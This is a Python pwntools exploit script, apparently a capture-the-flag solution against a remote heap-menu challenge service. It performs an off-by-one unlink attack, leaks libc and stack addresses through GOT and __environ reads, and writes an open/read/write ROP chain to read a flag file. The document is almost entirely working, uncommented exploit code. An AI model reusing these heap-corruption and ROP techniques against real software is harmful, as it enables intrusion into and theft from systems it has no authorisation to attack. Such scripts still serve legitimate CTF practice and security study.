from pwn import*
def add(size,text):
	p.sendlineafter('>> ','1')
	p.recvuntil('______?')
	p.sendline(str(size))
	p.recvuntil('yes_or_no?')
	p.send(text)
def free(index):
	p.sendlineafter('>> ','2')
	p.recvuntil('index ?')
	p.sendline(str(index))
def show(index):
	p.sendlineafter('>> ','3')
	p.recvuntil('index ?')
	p.sendline(str(index))
def edit(index,text):
	p.sendlineafter('>> ','4')
	p.recvuntil('index ?')
	p.sendline(str(index))
	p.recvuntil('content ?')
	p.send(text)
p = remote('121.36.209.145',9998)
#context.log_level = 'debug'
elf = ELF('./main')
libc = ELF('./libc-2.23.so')
p.sendlineafter('your name?','FMYY')
add(0x88,'U'*0x89)
add(0x1000-0x10,'U'*0xF0)
add(0x100,'U'*0x100)
unlink =  0x6032E0
payload  = p64(0) + p64(0x81)
payload += p64(unlink - 0x18)
payload += p64(unlink - 0x10)
payload = payload.ljust(0x80,'U')
payload += p64(0x80) + '\x00'
edit(0,payload)
free(1)
edit(0,'\x00'*0x18 +p64(elf.got['read']) + p64(unlink))
show(0)
p.recvline()
libc_base = u64(p.recv(6).ljust(8,'\x00')) - libc.sym['read']
log.info('Libc_Base:\t' + hex(libc_base))
libc.address = libc_base
edit(1,p64(unlink) + p64(0x6033E0) + p64(libc.sym['__environ']))
show(2)
p.recvline()
Stack = u64(p.recv(6).ljust(8,'\x00')) -0x228
ROP  = './flag\x00\x00'
ROP += p64(libc.address + 0x021102)
ROP += p64(0x6033E0)
ROP += p64(libc.address + 0x0202E8)
ROP += p64(0)
ROP += p64(libc.symbols['open'])
ROP += p64(libc.address + 0x021102)
ROP += p64(3)
ROP += p64(libc.address + 0x0202E8)
ROP += p64(libc.address + 0x3C6700)
ROP += p64(libc.address + 0x001B92)
ROP += p64(0x100)
ROP += p64(libc.symbols['read'])
ROP += p64(libc.address + 0x021102)
ROP += p64(1)
ROP += p64(libc.address + 0x0202E8)
ROP += p64(libc.address + 0x3C6700)
ROP += p64(libc.address + 0x001B92)
ROP += p64(0x100)
ROP += p64(libc.symbols['write'])
payload  = p64(0x6033E0)
payload += p64(0x4009A9)
edit(1,ROP)
edit(0,p64(Stack))
edit(0,payload)
p.interactive()
